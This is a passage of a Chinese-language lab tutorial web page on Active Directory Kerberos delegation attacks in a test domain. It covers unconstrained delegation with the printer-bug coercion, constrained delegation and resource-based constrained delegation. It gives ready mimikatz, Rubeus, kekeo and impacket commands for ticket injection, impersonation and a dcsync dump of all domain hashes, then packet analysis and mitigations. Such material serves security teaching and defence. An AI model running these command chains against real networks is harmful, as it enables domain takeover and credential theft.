+<p>可以看到会生成一个 test@krbtgt 的票据，如图所示：</p>
+<p><img alt="截图" src="a1a5537ef04c2baa136d7dd956821914.png" /></p>
+<p>然后我们用 mimikatz 执行如下命令将这个票据导入内存中。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>#导入票据
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>kerberos::ptt [0;58cdc]-2-0-60a10000-test@krbtgt-XIE.COM.kirbi
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>#查看票据
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>kerberos::list
+</code></pre></div>
+<p>如图所示，使用 mimikatz 将票据导入内存中，然后访问域控，可以看到导入票据后成功访问域控。</p>
+<p><img alt="截图" src="185c57adf0a529a784a9a8f543ad9ab4.png" /></p>
+<h4 id="2_3">（2）结合打印机漏洞攻击<a class="headerlink" href="#2_3" title="Permanent link">&para;</a></h4>
+<p>上面的攻击手段，还需要域管理员主动连接配置了非约束性委派的主机，才能从该主机上抓到域管理员的 TGT 认购权证，实战中意义不大。于是，我们可以<strong>利用打印机服务漏洞来强制域控连接配置了非约束性委派的主机，也能从该主机上抓到域控机器用户的 TGT 认购权证，且不需要管理员交互</strong>！</p>
+<p>在 win7 上以管理员权限用 <code>Rubeus</code> 执行如下命令每隔一秒监听一次来自 AD01 主机的票据。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>Rubeus.exe monitor /interval:1 /filteruser:AD01$
+</code></pre></div>
+<p>如图所示，使用 Rubeus 监听 AD01 主机的票据。</p>
+<p><img alt="截图" src="cd188a51de5d23f908f2fe7367464dc3.png" /></p>
+<p>然后在 Win7 上执行如下命令使用打印机服务漏洞攻击域控 AD01，使其强制回连认证我们的 win7 主机。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>SpoolSample.exe AD01 win7
+</code></pre></div>
+<p>如图所示，使用打印机服务漏洞攻击域控 AD01。</p>
+<p><img alt="截图" src="beb2329c263385ffcc87d59509764391.png" /></p>
+<p>如图所示，可以看到我们的 Rubeus 已经收到来自 AD01 的 base64 的 TGT 认购权证了。</p>
+<p><img alt="截图" src="ddd51eaa3991ace6a317680ee2822ee4.png" /></p>
+<p>然后我们可以直接使用 Rubeus 执行如下命令导入这个 base64 的 TGT 认购权证，就可以使用 mimikatz 导出域内所有用户 hash 了。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>Rubeus.exe ptt /ticket:base64 格式的票据
+</code></pre></div>
+<p>如图所示，可以看到没导入票据之前，mimikatz 是无法导出域内用户 hash 的。</p>
+<p><img alt="截图" src="056997110920991655ce0c87aa9ecc7d.png" /></p>
+<p>Rubeus 导入票据后，就可以导出域内用户 hash 了。如图所示：</p>
+<p><img alt="截图" src="fce1c430b579dd782b0cd05d434c2f87.png" /></p>
+<p>或者也可以使用 mimikatz 执行如下命令，导出内存中的票据，导出后的票据后缀为.kirbi，然后使用 mimikatz 直接导入这个.kirbi 票据，再导出域内用户 hash。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>privilege::debug
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>#导出票据
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>sekurlsa::tickets /export
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>#导入票据
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>kerberos::ptt [0;21467]-2-1-60a10000-AD01$@krbtgt-XIE.COM.kirbi
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>#导出域内所有用户 hash
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>lsadump::dcsync /all /csv
+</code></pre></div>
+<p>如图所示，导出内次中的票据。</p>
+<p><img alt="截图" src="06f93defc46cf2954b0abb303729af69.png" /></p>
+<p>然后再使用 mimikatz 导出票据，即可导出域内用户哈希了。如图所示：</p>
+<p><img alt="截图" src="6451db58843efc3e861873c9bc895ff0.png" /></p>
+<p>注：域控机器用户不能用于登录，但是有 <code>Dcsync</code> 权限，所以可以用于导出域内用户哈希。</p>
+<h3 id="2_4">2.约束性委派攻击<a class="headerlink" href="#2_4" title="Permanent link">&para;</a></h3>
+<p>以下是实验环境：</p>
+<ul>
+<li>域控：AD01 (10.211.55.4)</li>
+<li>域成员主机：Win7 (10.211.55.6) </li>
+<li>域管理员：test</li>
+<li>服务账号：hack</li>
+<li>域：xie.com</li>
+</ul>
+<p>攻击流程：</p>
+<p>1）服务账号 hack 使用自己的账号密码向 KDC 申请一个可转发的 TGT 认购权证，注意在 KDC Option 里面选择 forwardable 标志位，这样的话请求的 TGT 认购权证就是可转发的。
+2）服务账号 hack 以域管理员 test 身份申请一个针对自身服务的 ST 服务票据(这一步就是 <strong>S4U2Self</strong>)，这一步生成的 ST 服务票据是<strong>可转发</strong>的。
+3）服务账号 hack 拿着上一步可转发的 ST 服务票据以域管理员 test 身份向 KDC申请访问特定服务(cifs/ad01.xie.com)的 ST 服务票据(<strong>S4U2Proxy</strong>)。
+4）导入上一步获得的以域管理员 test 身份访问特定服务(cifs/ad01.xie.com)的ST 服务票据，即可成功访问域控。</p>
+<p>约束性委派攻击可以利用服务账号和主机账号，因为只有服务账号和主机账号具有委派属性。域用户账号注册 SPN 之后就成为了服务账号。主机账号的话我们可以手动去创建。</p>
+<p>我们将域用户 hack 执行如下命令注册为某个 SPN 的服务账号。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>#将域用户 hack 注册为 SPN SQLServer/win7.xie.com:1434 的服务账号，只有机器账号和域管理员账号有权限
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>setspn -U -A SQLServer/win7.xie.com:1434 hack
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>#查找指定 hack 用户注册的 SPN
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>setspn -L hack
+</code></pre></div>
+<p>如图所示，给 hack 用户注册 SPN。</p>
+<p><img alt="截图" src="da559469282b7fcd72fbfe5bf01e8bff.png" /></p>
+<p>或者创建一个机器账号 hack2 也可以，如图所示。</p>
+<p><img alt="截图" src="b6e69d39cb2f80e9627c3f6a22be248e.png" /></p>
+<p>这里我们使用 hack 服务账号来配置约束性委派属性。在域控上修改用户 hack 的委派属性为约束性委派，协议为域控 AD01 的 CIFS 协议，如图所示：</p>
+<p><img alt="截图" src="d172b4f8b28c150691af21f48713d01e.png" /></p>
+<p>此时我们拿到了域内一台主机 Win7 的权限，该主机当前登录着 xie\hack 用户，抓取到其密码为 P@ss1234，然后通过 adfind 执行如下命令查询发现 hack 用户被赋予了约束性委派，并且委派的 SPN 是 cifs/AD01.xie.com。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>#查询域中配置了约束性委派的服务账户，并可以看到被委派的 SPN
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>AdFind.exe -b &quot;DC=xie,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; -dn
+</code></pre></div>
+<p>如图所示，可以看到查询出 hack 用户被赋予了约束性委派，并且委派的 SPN 是cifs/AD01.xie.com。</p>
+<p><img alt="截图" src="fc1364c621765f87168cfa47e85c8136.png" /></p>
+<p>然后我们就可以进行约束性委派攻击了，如下我们使用 impacket 和 Rubeus 进行约束性委派攻击。</p>
+<h4 id="1-impacket">（1）使用 impacket 攻击<a class="headerlink" href="#1-impacket" title="Permanent link">&para;</a></h4>
+<p>首先，需要把攻击机的<code>/etc/resolv.conf</code> 文件中的 DNS 服务器指定为域控。然后执行如下命令进行攻击：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>#以 test 的身份申请一张访问 cifs/ad01.xie.com 服务的票据
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>python3 getST.py -dc-ip AD01.xie.com xie.com/hack:P@ss1234 -spn cifs/ad01.xie.com -impersonate test
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>python3 getST.py -dc-ip AD01.xie.com xie.com/server_account:P@ss1234 -spn cifs/ad01.xie.com -impersonate administrator
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>#导入票据
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>export KRB5CCNAME=test.ccache
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>python3 smbexec.py -no-pass -k ad01.xie.com
+</code></pre></div>
+<p>如图所示，可以看到执行完这些命令后，即可远程连接域控制器 AD01。</p>
+<p><img alt="截图" src="ef09c6eef0cffb670e7691df85afe3ee.png" /></p>
+<p>如果出现如图所示报错，则是因为给 hack 用户配置委派的时候，选择的是仅使用Kerberos(K) ，如图所示，这样的话就不会进行协议转化，所以报错。</p>
+<p><img alt="截图" src="7bb284928454e6584a1b55a7415db1c3.png" /></p>
+<p><img alt="截图" src="8d8f1ceb41beabb2aefefaf513253c41.png" /></p>
+<h4 id="2-kekeo">（2）使用 kekeo 攻击<a class="headerlink" href="#2-kekeo" title="Permanent link">&para;</a></h4>
+<p>我们也可以在 Win7 上使用 kekeo 执行如下命令生成 ST 服务票据：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>#使用 hack 账号申请一个 TGT 认购权证
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>tgt::ask /user:hack /domain:xie.com /password:P@ss1234
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>#使用上一步的 TGT 认购权证，利用 S4U 协议，以 test@xie.com 用户权限申请一张访问
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>cifs/AD01.xie.com 服务的 ST 服务票据
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>tgs::s4u /tgt:TGT_hack@XIE.COM_krbtgt~xie.com@XIE.COM.kirbi /user:test@xie.com /service:cifs/AD01.xie.com
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>tgs::s4u /tgt:TGT_server_account@XIE.COM_krbtgt~xie.com@XIE.COM.kirbi /user:administrator@xie.com /service:cifs/AD01.xie.com
+</code></pre></div>
+<p>如图所示，使用 kekeo 进行约束性委派攻击，其会生成三个票据。</p>
+<p><img alt="截图" src="4f4702360d158422340335a1346a0e60.png" /></p>
+<p>然后使用 mimikatz 执行如下命令将最后的 s4u2proxy 步骤生成的 ST 服务票据导入内存中，即可访问域控的 CIFS 服务。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>kerberos::ptt TGS_test@xie.com@XIE.COM_cifs~AD01.xie.com@XIE.COM.kirbi
+</code></pre></div>
+<p>如图所示，使用 mimikatz 将票据导入内存中后，即可远程访问域控。</p>
+<p><img alt="截图" src="2ea77d4fe778bf5248f5d3638dbf25f8.png" /></p>
+<h4 id="3_3">（3）约束性委派攻击抓包分析<a class="headerlink" href="#3_3" title="Permanent link">&para;</a></h4>
+<p>下面我们对约束性委派攻击进行抓包分析。在进行约束性委派攻击时，使用 WireShark 进行抓包，如图所示，一共有 6 个包。</p>
+<p><img alt="截图" src="6309a6be39de17fc4b21510f1fd51430.png" /></p>
+<p>前面两个 AS-REQ&amp;AS-REP 数据包，就是以服务账号 hack 的身份向域控请求可转发的 TGT 认购权证。对应的就是第一条命令。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>tgt::ask /user:hack /domain:xie.com /password:P@ss1234
+</code></pre></div>
+<p>后面四个 TGS-REQ&amp;TGS-REP 的数据包对应的就是第二条命令。使用第一步获取到的可转发的 TGT 认购权证向域控申请具有指定用户(test)权限访问指定服务(cifs/AD01.xie.com)的 ST 服务票据。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>tgs::s4u /tgt:TGT_hack@XIE.COM_krbtgt~xie.com@XIE.COM.kirbi /user:test@xie.com /service:cifs/AD01.xie.com
+</code></pre></div>
+<h5 id="1as-req">1）AS-REQ<a class="headerlink" href="#1as-req" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第一个 AS-REQ 请求包，以 hack 用户身份向 KDC 请求可转发的TGT 认购权证。</p>
+<p><img alt="截图" src="331ab2aad2a3136e29c6fb2cefadc1a5.png" /></p>
+<h5 id="2as-rep">2）AS-REP<a class="headerlink" href="#2as-rep" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第二个 AS-REP 回复包，KDC 返回可转发的 TGT 认购权证，也就是 <code>TGT_hack@XIE.COM_krbtgt~xie.com@XIE.COM.kirbi</code></p>
+<p><img alt="截图" src="2d0005ce66e14576419acb374f1e5d77.png" /></p>
+<h5 id="3tgs-req">3）TGS-REQ<a class="headerlink" href="#3tgs-req" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第三个 TGS-REQ 请求包，需要用到上一步得到的 TGT 认购权证，以 test 的身份向 TGS 服务申请了一张访问自身服务(hack 服务账号所在的服务)的 ST 票据，这一步对于的就是 <code>S4U2Self</code>。</p>
+<p><img alt="截图" src="aeb0cbde71734d971467fe4d2fb4fd8a.png" /></p>
+<h5 id="4tgs-rep">4）TGS-REP<a class="headerlink" href="#4tgs-rep" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第四个 TGS-REP 回复包，KDC 返回了<strong> test 用户访问自身服务(hack 服务账号所在的服务)的 可转发 ST 服务票据</strong>，服务端为 hack，也就是<code>TGS_test@xie.com@XIE.COM_hack@XIE.COM.kirbi</code></p>
+<p><img alt="截图" src="6bfcb80cbe54b140d7f24b7d39b23378.png" /></p>
+<h5 id="5tgs-req">5）TGS-REQ<a class="headerlink" href="#5tgs-req" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第五个 TGS-REQ 请求包，hack 得到<code>TGS_test@xie.com@XIE.COM_hack@XIE.COM.kirbi</code> 票据后，会在 TGS-REQ的 <code>additional-tickets</code> 处带上该票据，再次向 KDC 发起 S4U2Proxy 请求，以test 的名义请求一张访问域控 AD01 CIFS 服务的票据。这一步对应的就是<code>S4U2Proxy</code></p>
+<p><img alt="截图" src="6b6dc933f2d27b1cfc7134e5e04560e1.png" /></p>
+<h5 id="6tgs-rep">6）TGS-REP<a class="headerlink" href="#6tgs-rep" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第六个 TGS-REP 回复包，就是 KDC 返回的<strong>以 test 身份访问域控AD01 的 CIFS 服务的 ST 票据</strong><code>TGS_test@xie.com@XIE.COM_cifs~AD01.xie.com@XIE.COM.kirbi</code></p>
+<p><img alt="截图" src="b5b431c8836466d82b0fc2c182b75619.png" /></p>
+<h3 id="3_4">3.基于资源的约束性委派攻击<a class="headerlink" href="#3_4" title="Permanent link">&para;</a></h3>
+<p>以下是实验环境：</p>
+<ul>
+<li>域控：AD01 (10.211.55.4) </li>
+<li>域成员主机：Win2008 (10.211.55.7) </li>
+<li>域用户：hack</li>
+<li>域管理员：administrator </li>
+<li>域：xie.com</li>
+</ul>
+<p>如图所示，这里我们已经拿到了域内一台主机 (win2008) 的普通域账号权限（xie\hack），但是该域用户不在 win2008 的管理员组中，因此我们无法执行mimikatz 等高权限操作。现在我们需要利用基于资源的约束委派进行本地提权，拿到 win2008 主机的 system 权限。</p>
+<p><img alt="截图" src="badab5b39af4b9bbdb1887602e53949a.png" /></p>
+<p>如图所示，通过 LDAP 协议查询域内机器账号的创建者，我们发现，机器win2008.xie.com 的创建者为 hack 用户，也就是当前登录的用户。</p>
+<p><img alt="截图" src="447d4c1173d8205afe4ab943482e6e42.png" /></p>
+<p>于是我们可以通过创建一个机器账号 machine，然后<strong>配置新建的机器账号machine 到 win2008 机器的基于资源的约束性委派</strong>。详细配置如图所示：</p>
+<p><img alt="截图" src="01c0d010d3a0f42c787711638a78bda2.png" /></p>
+<p>如图所示，可以看到基于资源的约束性委派配置成功！</p>
+<p><img alt="截图" src="a59a5aa9209ee91e5d961c8ff26c81b2.png" /></p>
+<h4 id="1-impacket_1">（1）使用 impacket 攻击<a class="headerlink" href="#1-impacket_1" title="Permanent link">&para;</a></h4>
+<p>首先，需要把攻击机的<code>/etc/resolv.conf</code> 文件中的 DNS 服务器指定为域控。然后执行如下命令进行攻击：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>#以 administrator 的身份申请一张访问 cifs/win2008.xie.com 服务的票据
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>python3 getST.py -dc-ip AD01.xie.com xie.com/machine$:root -spn cifs/win2008.xie.com -impersonate administrator
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>#导入票据
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>export KRB5CCNAME=administrator.ccache
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>python3 smbexec.py -no-pass -k win2008.xie.com
+</code></pre></div>
+<p>如图所示，可以看到执行完这些命令后，成功获得 win2008 机器的 System 权限。</p>
+<p><img alt="截图" src="25d9bc6d9e76b4b8e3e06c6c448e4d3d.png" /></p>
+<h4 id="2_5">（2）基于资源的约束性委派攻击抓包分析<a class="headerlink" href="#2_5" title="Permanent link">&para;</a></h4>
+<p>下面我们对约束性委派攻击进行抓包分析。在进行基于资源的约束性委派攻击时，使用 WireShark 进行抓包，如图所示，一共有 6 个包。</p>
+<p><img alt="截图" src="1213e271482ca88a3e9058a237322d39.png" /></p>
+<p>前面两个 AS-REQ&amp;AS-REP 数据包，就是<strong>以机器账号 machine 的身份向域控请求可转发的 TGT 票据。</strong></p>
+<p>后面四个是 TGS-REQ&amp;TGS-REP 的数据包，使用第一步获取到的可转发的 TGT认购权证以 administrator 身份通过<code>S4u2Self</code>协议访问自身，获取到不可转发的ST 服务票据。然后再通过此不可转发的 ST 服务票据，以 administrator 身份通过以<code>S4u2Proxy</code>协议申请访问指定服务(cifs/win2008.xie.com)的可转发 ST 服务票据。</p>
+<h5 id="1as-req_1">1）AS-REQ<a class="headerlink" href="#1as-req_1" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第一个 AS-REQ 请求包，以机器账号 machine 用户身份向 KDC 请求可转发的 TGT 票据。</p>
+<p><img alt="截图" src="588f4210e21916f499e6fa6c4b76a147.png" /></p>
+<h5 id="2as-rep_1">2）AS-REP<a class="headerlink" href="#2as-rep_1" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第二个 AS-REP 回复包，KDC 返回可转发的 TGT 认购权证。</p>
+<p><img alt="截图" src="d0b6a5d1d8febd91f50faa1ac317bc06.png" /></p>
+<h5 id="3tgs-req_1">3）TGS-REQ<a class="headerlink" href="#3tgs-req_1" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第三个 TGS-REQ 请求包，<strong>这一步就是 S4U2Self 阶段</strong>，<strong>机器账号machine 以 administrator 身份访问自身服务</strong>。</p>
+<p><img alt="截图" src="bec25478dae751e3ccde8fca9c57d729.png" /></p>
+<h5 id="4tgs-rep_1">4）TGS-REP<a class="headerlink" href="#4tgs-rep_1" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第四个 TGS-REP 回复包，<strong>这里 KDC 返回不可转发的 ST 服务票据</strong>。但是在基于资源的约束性委派流程中，不可转发的 ST 服务票据也是可以通过S4U2Proxy 转发到其他服务进行委派认证，并且最后服务还会返回一张可转发的ST 服务票据！</p>
+<p><img alt="截图" src="434b15887816eb398e8dbdd841fca1c9.png" /></p>
+<h5 id="5tgs-req_1">5）TGS-REQ<a class="headerlink" href="#5tgs-req_1" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第五个 TGS-REQ 请求包，这一步就是 <strong>S4U2Proxy</strong> 阶段，<strong>机器账号machine 以 administrator 身份申请 cifs/win2008.xie.com 服务的 ST 服务票据，带着上一步获取到的不可转发的 ST 服务票据放在 additional_tickets 里面。</strong></p>
+<p><img alt="截图" src="e1973938210380afbdebdfa46a8809b4.png" /></p>
+<h5 id="6tgs-rep_1">6）TGS-REP<a class="headerlink" href="#6tgs-rep_1" title="Permanent link">&para;</a></h5>
+<p>如图所示，是第六个 TGS-REP 回复包，<strong>KDC 返回以 administrator 身份访问cifs/win2008.xie.com 服务的 ST 服务票据</strong>。</p>
+<p><img alt="截图" src="be0e8fddd3b5e0fc8e2ac10130ad6f5a.png" /></p>
+<h2 id="_8">域委派攻击防范措施<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<ul>
+<li>高权限的用户，设置不能被委派，如图所示，设置 administrator 用户不能被委派。</li>
+<li>主机账号需设置委派时，只能设置为约束性委派；</li>
+<li>Windows 2012 R2 及更高的系统建立了受保护的用户组 ProtectedUsers，该组内的用户不允许被委派。将需要被保护的服务用户加入该组中即可。</li>
+</ul>
+<p><img alt="截图" src="58959f8fb91d0965f79a3ec693c08245.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 hypnotic
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../../../..", "features": ["header.autohide", "navigation.instant", "navigation.tracking", "content.code.annotate", "toc.integrate", "toc.follow", "navigation.path", "navigation.top", "navigation.tabs", "navigation.prune", "navigation.footer", "navigation.tabs.sticky", "navigation.sections", "content.code.copy", "navigation.indexes", "search.share", "search.suggest", "search.highlight"], "search": "../../../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../../../../javascripts/extra.js"></script>
+      
+        <script src="../../../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
